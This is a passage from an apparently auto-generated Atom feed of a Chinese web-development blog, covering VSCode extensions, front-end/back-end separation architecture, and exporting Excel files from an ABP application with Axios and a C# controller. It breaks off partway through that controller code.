&lt;li&gt;函数名后加空格 &lt;code&gt;function name (arg) { ... }&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;坚持使用全等 &lt;code&gt;===&lt;/code&gt;摒弃 &lt;code&gt;==&lt;/code&gt;一但在需要检查 &lt;code&gt;null || undefined&lt;/code&gt;时可以使用 &lt;code&gt;obj == null&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;一定要处理 Node.js 中错误回调传递进来的 &lt;code&gt;err&lt;/code&gt;参数。&lt;/li&gt;
&lt;li&gt;使用浏览器全局变量时加上 &lt;code&gt;window&lt;/code&gt;前缀 – &lt;code&gt;document&lt;/code&gt;和 &lt;code&gt;navigator&lt;/code&gt;除外&lt;/li&gt;
&lt;li&gt;避免无意中使用到了这些命名看上去很普通的全局变量， &lt;code&gt;open&lt;/code&gt;, &lt;code&gt;length&lt;/code&gt;,&lt;code&gt;event&lt;/code&gt; 还有 &lt;code&gt;name&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;请参阅 &lt;a href=&quot;http://standardjs.com/#the-rules&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;完整的规则列表&lt;/a&gt;&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;npm&quot;&gt;&lt;a href=&quot;#npm&quot; class=&quot;headerlink&quot; title=&quot;npm&quot;&gt;&lt;/a&gt;npm&lt;/h3&gt;&lt;p&gt;运行npm命令&lt;/p&gt;
&lt;h3 id=&quot;Npm-Intellisense&quot;&gt;&lt;a href=&quot;#Npm-Intellisense&quot; class=&quot;headerlink&quot; title=&quot;Npm Intellisense&quot;&gt;&lt;/a&gt;Npm Intellisense&lt;/h3&gt;&lt;p&gt;对package.json内中的依赖包的名称提示&lt;/p&gt;
&lt;h3 id=&quot;Output-Colorizer&quot;&gt;&lt;a href=&quot;#Output-Colorizer&quot; class=&quot;headerlink&quot; title=&quot;Output Colorizer&quot;&gt;&lt;/a&gt;Output Colorizer&lt;/h3&gt;&lt;p&gt; 彩色输出信息&lt;/p&gt;
&lt;h3 id=&quot;Path-Autocomplete&quot;&gt;&lt;a href=&quot;#Path-Autocomplete&quot; class=&quot;headerlink&quot; title=&quot;Path Autocomplete&quot;&gt;&lt;/a&gt;Path Autocomplete&lt;/h3&gt;&lt;p&gt;路径完成提示&lt;/p&gt;
&lt;h3 id=&quot;Path-Intellisense&quot;&gt;&lt;a href=&quot;#Path-Intellisense&quot; class=&quot;headerlink&quot; title=&quot;Path Intellisense&quot;&gt;&lt;/a&gt;Path Intellisense&lt;/h3&gt;&lt;p&gt;文件路径补全&lt;/p&gt;
&lt;h3 id=&quot;Prettify-JSON&quot;&gt;&lt;a href=&quot;#Prettify-JSON&quot; class=&quot;headerlink&quot; title=&quot;Prettify JSON&quot;&gt;&lt;/a&gt;Prettify JSON&lt;/h3&gt;&lt;p&gt;格式化JSON&lt;/p&gt;
&lt;h3 id=&quot;SpellChecker&quot;&gt;&lt;a href=&quot;#SpellChecker&quot; class=&quot;headerlink&quot; title=&quot;SpellChecker&quot;&gt;&lt;/a&gt;SpellChecker&lt;/h3&gt;&lt;p&gt;自然语言的拼写检查&lt;/p&gt;
&lt;h3 id=&quot;SVG-Viewer&quot;&gt;&lt;a href=&quot;#SVG-Viewer&quot; class=&quot;headerlink&quot; title=&quot;SVG Viewer&quot;&gt;&lt;/a&gt;SVG Viewer&lt;/h3&gt;&lt;p&gt;svg预览&lt;/p&gt;
&lt;h3 id=&quot;Trailing-Spaces&quot;&gt;&lt;a href=&quot;#Trailing-Spaces&quot; class=&quot;headerlink&quot; title=&quot;Trailing Spaces&quot;&gt;&lt;/a&gt;Trailing Spaces&lt;/h3&gt;&lt;p&gt;突出显示尾随空格并将其删除&lt;/p&gt;
&lt;h3 id=&quot;Version-Lens&quot;&gt;&lt;a href=&quot;#Version-Lens&quot; class=&quot;headerlink&quot; title=&quot;Version Lens&quot;&gt;&lt;/a&gt;Version Lens&lt;/h3&gt;&lt;p&gt;package.json文件显示模块当前版本和最新版本&lt;/p&gt;
&lt;h3 id=&quot;vetur&quot;&gt;&lt;a href=&quot;#vetur&quot; class=&quot;headerlink&quot; title=&quot;vetur&quot;&gt;&lt;/a&gt;vetur&lt;/h3&gt;&lt;p&gt;vue单文件能够像html，js，css一样编写，注释&lt;/p&gt;
&lt;h3 id=&quot;View-In-Browser&quot;&gt;&lt;a href=&quot;#View-In-Browser&quot; class=&quot;headerlink&quot; title=&quot;View In Browser&quot;&gt;&lt;/a&gt;View In Browser&lt;/h3&gt;&lt;p&gt;右键在浏览器打开&lt;/p&gt;
&lt;h3 id=&quot;Visual-Studio-Code-Format&quot;&gt;&lt;a href=&quot;#Visual-Studio-Code-Format&quot; class=&quot;headerlink&quot; title=&quot;Visual Studio Code Format&quot;&gt;&lt;/a&gt;Visual Studio Code Format&lt;/h3&gt;&lt;p&gt;vscode代码格式增强工具&lt;/p&gt;
&lt;h3 id=&quot;vscode-icons&quot;&gt;&lt;a href=&quot;#vscode-icons&quot; class=&quot;headerlink&quot; title=&quot;vscode-icons&quot;&gt;&lt;/a&gt;vscode-icons&lt;/h3&gt;&lt;p&gt;美化VSCode的界面，在文件名前面显示小图标&lt;/p&gt;
&lt;h3 id=&quot;Vue-2-Snippets&quot;&gt;&lt;a href=&quot;#Vue-2-Snippets&quot; class=&quot;headerlink&quot; title=&quot;Vue 2 Snippets&quot;&gt;&lt;/a&gt;Vue 2 Snippets&lt;/h3&gt;&lt;p&gt;vue2的语法高亮，语法提示&lt;/p&gt;
&lt;h3 id=&quot;VueHelper&quot;&gt;&lt;a href=&quot;#VueHelper&quot; class=&quot;headerlink&quot; title=&quot;VueHelper&quot;&gt;&lt;/a&gt;VueHelper&lt;/h3&gt;&lt;p&gt;Vue2代码段（包括Vue2 api、vue-router2、vuex2）&lt;/p&gt;
&lt;h3 id=&quot;wpy-beautify&quot;&gt;&lt;a href=&quot;#wpy-beautify&quot; class=&quot;headerlink&quot; title=&quot;wpy-beautify&quot;&gt;&lt;/a&gt;wpy-beautify&lt;/h3&gt;&lt;p&gt;vue2单文件格式化&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;hr&gt;
&lt;p&gt;由于VSCode貌似没有导出扩展列表的功能，所以在此记录下自己经常用到的一些扩展，同时也推荐给更多的朋友，希望能对大家有所帮助。&lt;br&gt;
    
    </summary>
    
    
      <category term="Web开发" scheme="http://qrframe.com/tags/Web%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>前后端分离的架构设计分析</title>
    <link href="http://qrframe.com/2017/10/12/%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E7%9A%84%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%88%86%E6%9E%90/"/>
    <id>http://qrframe.com/2017/10/12/前后端分离的架构设计分析/</id>
    <published>2017-10-12T08:32:57.000Z</published>
    <updated>2017-12-03T08:34:02.839Z</updated>
    
    <content type="html">&lt;h1 id=&quot;什么是前后端分离&quot;&gt;&lt;a href=&quot;#什么是前后端分离&quot; class=&quot;headerlink&quot; title=&quot;什么是前后端分离&quot;&gt;&lt;/a&gt;什么是前后端分离&lt;/h1&gt;&lt;p&gt;每个人对于前后端分离的理解都不太一样，大多数人会从物理层做区分，认为客户端的部分是前端，服务器端的部分是后端。但是，更为准确的分法是从职责上区分：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;负责交互与展示的部分为前端&lt;/li&gt;
&lt;li&gt;提供数据，处理业务的部分为后端&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;前后端分离意味着，前后端之间只通过API交互。从此，后端选用的技术栈不影响前端。当后端开发人员选择 Java 的时候，我可以不用 JSP 来编写前端页面，继续使用我的 React 又或者 Vue。而我使用 React 时，也不影响后端使用某一个框架。&lt;br&gt;前后端分离是在于技术架构上，而不是组织/流程、职位/工种的分离。所有组织/流程、职位/工种的限定，是为了更好的协作，而不应该限制人能力的发挥。如果人的能力强，当然可以全栈开发。且小团队肯定效率更高。反过来，跨部门联调这种事情，必定非常低效，且多后患，应极力避免。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;为什么要前后端分离&quot;&gt;&lt;a href=&quot;#为什么要前后端分离&quot; class=&quot;headerlink&quot; title=&quot;为什么要前后端分离&quot;&gt;&lt;/a&gt;为什么要前后端分离&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;&lt;h3 id=&quot;提高工作效率，分工更加明确&quot;&gt;&lt;a href=&quot;#提高工作效率，分工更加明确&quot; class=&quot;headerlink&quot; title=&quot;提高工作效率，分工更加明确&quot;&gt;&lt;/a&gt;提高工作效率，分工更加明确&lt;/h3&gt;前端只关注前端的事，后端只关心后端的活，两者开发可以同时进行。在后端还没有提供接口的时候，前端可以先通过Mock的方式模拟接口数据。页面的增加和路由的修改也不必再去麻烦后端，页面模板可以重复使用，开发更加灵活。&lt;/li&gt;
&lt;li&gt;&lt;h3 id=&quot;性能提升&quot;&gt;&lt;a href=&quot;#性能提升&quot; class=&quot;headerlink&quot; title=&quot;性能提升&quot;&gt;&lt;/a&gt;性能提升&lt;/h3&gt;前端页面可以按需加载，服务器也不需要解析前端页面，在页面交互及用户体验上有所提升。&lt;/li&gt;
&lt;li&gt;&lt;h3 id=&quot;降低维护成本&quot;&gt;&lt;a href=&quot;#降低维护成本&quot; class=&quot;headerlink&quot; title=&quot;降低维护成本&quot;&gt;&lt;/a&gt;降低维护成本&lt;/h3&gt;页面的调试不再需要后端人员的参与，可以非常快速的定位及发现问题所在，代码重构及可维护性增强。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;需要明确一点，并非所有的项目都需要前后端分离。前后端要不要分，怎么分，是由具体业务决定的。&lt;strong&gt;前后端分离的最终目的还是为了提高效率&lt;/strong&gt;，所以如果影响效率，不分也罢。&lt;/p&gt;
&lt;p&gt;下面列举一些推荐进行前后端分离的场景：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;网站需要跨设备兼容&lt;/li&gt;
&lt;li&gt;网站展示方式变换频繁&lt;/li&gt;
&lt;li&gt;页面交互比较复杂&lt;/li&gt;
&lt;li&gt;不需要搜索引擎优化（SEO）&lt;/li&gt;
&lt;li&gt;有专业的前后端团队&lt;/li&gt;
&lt;li&gt;有一套合理／可升级／客户端友好的API&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;当我们决定使用前后端分离时，我们仍然需要解决一系列的问题：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;接口的安全性是否足够&lt;/li&gt;
&lt;li&gt;采用哪种认证方式&lt;/li&gt;
&lt;li&gt;如何存储用户状态&lt;/li&gt;
&lt;li&gt;是否有明确的API文档&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;随着前端技术的发展和迭代，前端MV*框架应运而生，利用目前主流的前端框架，如React、Vue、Angular等我们可以轻松的构建起一个无需服务器端渲染就可以展示的网站，同时这类框架都提供了前端路由功能，后台可以不再控制路由的跳转，将原本属于前端的业务逻辑全部丢给前端，这样前后端分离可以说是最为彻底。&lt;br&gt;前后端分离的实现对前端人员的要求会上升一个层次，前端需要处理服务器返回的各种数据格式，还需要掌握一系列的数据处理逻辑、MVC思想和各种主流框架。&lt;/p&gt;
&lt;h1 id=&quot;常见的前后端分离方案&quot;&gt;&lt;a href=&quot;#常见的前后端分离方案&quot; class=&quot;headerlink&quot; title=&quot;常见的前后端分离方案&quot;&gt;&lt;/a&gt;常见的前后端分离方案&lt;/h1&gt;&lt;h3 id=&quot;SPA&quot;&gt;&lt;a href=&quot;#SPA&quot; class=&quot;headerlink&quot; title=&quot;SPA&quot;&gt;&lt;/a&gt;SPA&lt;/h3&gt;&lt;p&gt;使用目前主流的前端框架开发，由前端路由的方式代替后端的 controller，页面的展现完全靠JavaScript控制，使用 restful api 实现与后端的数据交互。&lt;/p&gt;
&lt;p&gt;SPA 是一个可以解决前后端分离的有效方案，适用于无 SEO 要求的项目。&lt;/p&gt;
&lt;h3 id=&quot;Node-js-中间层&quot;&gt;&lt;a href=&quot;#Node-js-中间层&quot; class=&quot;headerlink&quot; title=&quot;Node.js 中间层&quot;&gt;&lt;/a&gt;Node.js 中间层&lt;/h3&gt;&lt;p&gt;最早见于淘宝的前端团队在14年4月份提出的中途岛(Midway Framework)架构中&lt;/p&gt;
&lt;h1 id=&quot;参考资料&quot;&gt;&lt;a href=&quot;#参考资料&quot; class=&quot;headerlink&quot; title=&quot;参考资料&quot;&gt;&lt;/a&gt;参考资料&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://juejin.im/post/59dad63ff265da065270d49e?utm_source=gold_browser_extension&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;实践中的前后端分离&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://www.zhihu.com/question/28207685&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Web 前后端分离的意义大吗？&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;http://baijiahao.baidu.com/s?id=1561111462074628&amp;amp;wfr=spider&amp;amp;for=pc&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;前端工程师你真的懂前后端分离是什么意思吗？&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;http://www.cnblogs.com/luozhihao/p/5761515.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;我们为什么要尝试前后端分离&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
</content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;什么是前后端分离&quot;&gt;&lt;a href=&quot;#什么是前后端分离&quot; class=&quot;headerlink&quot; title=&quot;什么是前后端分离&quot;&gt;&lt;/a&gt;什么是前后端分离&lt;/h1&gt;&lt;p&gt;每个人对于前后端分离的理解都不太一样，大多数人会从物理层做区分，认为客户端的部分是前端，服务器端的部分是后端。但是，更为准确的分法是从职责上区分：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;负责交互与展示的部分为前端&lt;/li&gt;
&lt;li&gt;提供数据，处理业务的部分为后端&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;前后端分离意味着，前后端之间只通过API交互。从此，后端选用的技术栈不影响前端。当后端开发人员选择 Java 的时候，我可以不用 JSP 来编写前端页面，继续使用我的 React 又或者 Vue。而我使用 React 时，也不影响后端使用某一个框架。&lt;br&gt;前后端分离是在于技术架构上，而不是组织/流程、职位/工种的分离。所有组织/流程、职位/工种的限定，是为了更好的协作，而不应该限制人能力的发挥。如果人的能力强，当然可以全栈开发。且小团队肯定效率更高。反过来，跨部门联调这种事情，必定非常低效，且多后患，应极力避免。&lt;br&gt;
    
    </summary>
    
    
      <category term="架构设计" scheme="http://qrframe.com/tags/%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>ABP框架使用总结之使用Axios来导出Excel</title>
    <link href="http://qrframe.com/2017/09/25/ABP%E6%A1%86%E6%9E%B6%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93%E4%B9%8B%E4%BD%BF%E7%94%A8Axios%E6%9D%A5%E5%AF%BC%E5%87%BAExcel/"/>
    <id>http://qrframe.com/2017/09/25/ABP框架使用总结之使用Axios来导出Excel/</id>
    <published>2017-09-25T08:30:42.000Z</published>
    <updated>2017-12-03T08:31:53.443Z</updated>
    
    <content type="html">&lt;h2 id=&quot;需求说明&quot;&gt;&lt;a href=&quot;#需求说明&quot; class=&quot;headerlink&quot; title=&quot;需求说明&quot;&gt;&lt;/a&gt;需求说明&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;点击按钮，获取页面form表单的数据，发送到服务器生成Excel文档并下载到客户端。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;如果参数比较简单，我们可以直接通过GET请求访问生成Excel文档的Action。如：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;location.href = abp.appPath + &amp;apos;Service/Export?input=&amp;apos; + result;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;但是，如果参数比较复杂，且数量较多，继续使用这种方式则显得比较繁琐，并且容易报错。&lt;br&gt;此时，我们可以迂回一下，先把请求参数缓存到服务器，然后在生成Excel时从缓存获取参数。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;br&gt;以下是具体的实现：&lt;/p&gt;
&lt;p&gt;前台页面中导出按钮的点击事件代码如下：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;//先请求SaveData接口来缓存参数，然后用返回的result作为参数访问Export来导出Excel文档&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;_this.genDatas(function (result) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;       //result 生成的表单数据&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;       axios.post(abp.appPath + &amp;apos;Service/SaveData&amp;apos;, result).then(function (result) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;              _this.matloading = false;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;              location.href = abp.appPath + &amp;apos;Service/Export?input=&amp;apos; + result;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;       &amp;#125;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;);&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Controller 代码：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;33&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;34&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;35&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;36&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;37&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;38&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;39&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;40&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;41&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;42&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;43&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;44&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;45&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;46&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;47&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;48&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;49&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;50&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;51&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;52&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;53&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;54&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;55&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;56&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;57&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;58&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;59&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;60&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;61&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;62&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;63&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;64&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;65&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;66&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;67&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;68&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;69&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;70&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;71&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;72&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;73&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;74&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;75&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;76&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;77&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;78&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;79&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;80&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;81&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;82&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;83&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;84&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;85&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;86&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;public class ServiceController : ControllerBase&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        protected readonly IServiceAppService _serviceAppService;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        private readonly ICacheManager _cacheManager;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        public SendServiceController(IServiceAppService serviceAppService, ICacheManager cacheManager)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            _cacheManager = cacheManager;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            _serviceAppService = serviceAppService;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        /// &amp;lt;summary&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        /// 缓存参数，并返回No&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        /// &amp;lt;/summary&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        [System.Web.Http.HttpPost]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        public JsonResult SaveData(InputDto input)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            AsyncHelper.RunSync(()=&amp;gt;_cacheManager.GetCache(&amp;quot;Export&amp;quot;).SetAsync(input.No, input, TimeSpan.FromMinutes(10)));&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            return Json(input.No, JsonRequestBehavior.AllowGet);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        /// &amp;lt;summary&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        /// 导出Excel&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        /// &amp;lt;/summary&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        public FileResult Export(string input)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            try&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                var items = _cacheManager.GetCache(&amp;quot;Export&amp;quot;).GetOrDefault&amp;lt;string, InputDto&amp;gt;(input);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                var model = _serviceAppService.GetExportInfo(items);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                HSSFWorkbook workbook = new HSSFWorkbook();&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                BuildExcel(workbook.CreateSheet(&amp;quot;物品汇总列表&amp;quot;), model.Details.ToArray());&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                Stream ms = new MemoryStream();&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                workbook.Write(ms);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                ms.Seek(0, SeekOrigin.Begin);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                return File(ms, &amp;quot;application/ms-excel&amp;quot;, &amp;quot;物品列表.xls&amp;quot;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            catch (Exception ex)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                throw new Exception(&amp;quot;生成Excel出错&amp;quot;, ex);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        /// &amp;lt;summary&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        /// 生成Excel 只生成带有[DisplayName]特性的字段&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        /// &amp;lt;/summary&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        public void BuildExcel&amp;lt;T&amp;gt;(ISheet sheet,T[] list) where T : new()&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            var properties = typeof(T).GetProperties();&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            for (int num = 0; num &amp;lt;= list.Length; num++)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                var model = num == 0 ? new T() : list[num - 1];&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                IRow row = sheet.CreateRow(num);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                var cellCol = 0;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                for (int index = 0; index &amp;lt; properties.Length; index++)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                    var property = properties[index];&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                    var attr = property.GetCustomAttribute&amp;lt;DisplayNameAttribute&amp;gt;();&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                    if (attr == null)&lt;/div&gt;&lt;div 